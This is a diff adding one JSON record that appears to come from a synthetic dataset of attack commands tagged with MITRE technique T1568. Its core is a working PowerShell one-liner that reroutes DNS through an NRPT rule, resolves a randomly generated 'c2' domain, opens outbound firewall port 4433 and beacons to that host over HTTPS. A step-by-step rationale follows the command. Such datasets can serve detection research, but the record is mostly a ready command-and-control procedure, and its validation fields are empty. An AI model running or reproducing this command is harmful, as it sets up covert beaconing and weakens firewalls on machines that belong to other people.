@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $ns='.telemetry-sync'; Add-DnsClientNrptRule -Namespace $ns -NameServers '9.9.9.9' -ErrorAction SilentlyContinue | Out-Null; Clear-DnsClientCache; $dom=('node{0}.c2{1}{2}' -f (Get-Random -Min 10 -Max 99),(Get-Date -Format 'MMdd'),$ns); $res=Resolve-DnsName $dom -Type A -ErrorAction SilentlyContinue; if($res){ netsh advfirewall firewall add rule name='out_4433' dir=out action=allow protocol=TCP remoteport=4433 | Out-Null; $ip=$res[0].IPAddress; if((Test-NetConnection -ComputerName $ip -Port 4433).TcpTestSucceeded){ Invoke-WebRequest -Uri ('https://{0}:4433/api' -f $dom) -Headers @{ Host=$dom; 'X-Req'=(Get-Random) } -TimeoutSec (Get-Random -Min 5 -Max 10) -UseBasicParsing } } }",
+  "explanation": "Adds an NRPT rule to route specific suffix queries to a custom resolver, resolves a DGA host, opens outbound 4433, verifies reachability, and then beacons.",
+  "rationale_steps": [
+    "Create an NRPT rule for selective DNS routing to an external resolver.",
+    "Generate and resolve a DGA domain under the controlled suffix.",
+    "Permit egress to a non-standard TLS port and verify connectivity.",
+    "Beacon over HTTPS using a Host header to maintain domain context."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-710592d1",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
